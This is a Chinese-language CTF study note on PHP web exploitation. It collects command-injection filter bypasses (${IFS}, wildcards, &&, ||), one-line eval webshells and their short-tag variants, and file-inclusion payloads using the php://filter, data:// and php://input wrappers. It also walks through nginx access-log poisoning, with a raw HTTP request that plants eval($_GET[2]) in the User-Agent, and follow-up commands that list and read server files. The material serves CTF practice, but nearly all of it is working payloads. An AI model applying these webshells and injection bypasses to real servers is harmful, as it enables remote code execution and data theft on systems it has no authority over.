## 笔记

<br><br>

* 在逆向(星号)((BYTE*)的时候用宏定义#define BYTE unsigned char即可正常使用

<br>

* system("tac flag.php")用来读取文件内容;

<br>

* ?c=system("tac%20fla(星号)")意思是c=system("tac flag");


````
3.5 通配符绕过

[…]表示匹配方括号之中的任意一个字符
{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。
{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开

````

<br>

* --命令绕过

<br>

黑洞绕过：system($c." >/dev/null 2>&1");
* 它只会让分号后面的指令进入黑洞，所以这里直接绕过

* 双写分号绕过?c=tac f*;ls
* 双写&&绕过?c=tac f*%26%26ls（注：星号被绕过可以用问号）（[0-9]和%的过滤是不会过滤%26之类的）（）

* 带行号绕过?c=nl<fla''g.php%7C%7Cls(此方法可能要右键看源代码)

* 有$的情况下可以重命名flag.php成txt再直接访问:先执行?c=mv${IFS}fla?.php${IFS}a.txt%7C%7Cls 然后使用ls||ls看看有没有命名成功。成功后直接访问a.txt

* 其他注：?c=ls${IFS}/||ls查看根目录（ls /）

* ?c=cp${IFS}/fla?${IFS}/var/www/html/b.txt（将根目录（ls /）下的flag复制到可以直接在url的目录）

直接写php时：
* 经典一句话木马：<?php @eval($_POST[a]); ?>
* 短标签（过滤php）绕过：<?=eval($_POST[a]);?>（需要配合user.ini打开权限）
* 过滤[]:<?=eval($_POST{a});?>(改成花括号)
* 过滤分号’；‘：<?=`cat ../flag*`?> <?=`tac ../f*`?> <?=`nl ../flag*`?>查看源码得flag




<br>

直接eval()传参时：
* 特殊字符:"$""&"如果只是对c进行过滤，就可以通过包含另一个函数来绕过
* 做题前先看看对谁过滤，再看如何过滤
* c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
* c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
* c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
* 仅括号
* c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
* c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
* c=show_source(next(array_reverse(scandir(pos(localeconv())))));
* c=highlight_file(next(array_reverse(scandir(dir))));
<br>

当include(c)时：直接使用协议绕过
* c=data://text/plain,<?php system('tac f*');?>

<br>

* php被过滤的时候:
* ?c=data://text/plain,<?=system("tac fla*")?>
* 注：include()只会处理<?php>里面的内容

<br>

* $被过滤的时候:
* ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
* ?c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");

<br>

* 日志文件包含：（抓包改UA，在UA末尾加东西）
* 如：
````
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>       \\在这里改噢
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
Connection: close
````


<br>

* 可以直接命令执行即可也可以用webshell后门工具连接

* ?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();

* ?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();


<br>

条件竞争漏洞：（相关：2023年孟极光线上赛web）（文件上传，文件包含等都能用）
- [条件竞争](https://www.freebuf.com/articles/web/275557.html)

````
一般使用方法：

php://filter/ [read|write =]过滤器|过滤器/resource=要过滤的数据流 conversion filter(转换过滤器) convert.base64-encode & convert.base64-decode(base64加密解密) 例如：php://filter/convert.base64-encode/resource=flag.php

过滤器可以设置多个

php://filter读取源代码并进行base64编码输出，例如一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个PHP文件，PHP代码是不会显示到页面上的，例如：

他只显示了一条语句，这时我们可以以base64编码的方式读取指定文件的源码：

php://input协议

input协议可以访问请求的原始数据的制度刘，将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容作为文件内容，从而导致任意代码的执行。

利用该方法，我们可以直接写入php文件，输入file=php://input，然后用burp抓包，写入PHP代码：

data://text/plain协议

同样类似php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行，从而导致任意代码执行。

利用data://伪协议可以直接达到执行php代码的效果，例如执行phpinfo();

格式：data://text/plain,流

例如：

data://text/plain,<?php phpinfo();?>
//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

````




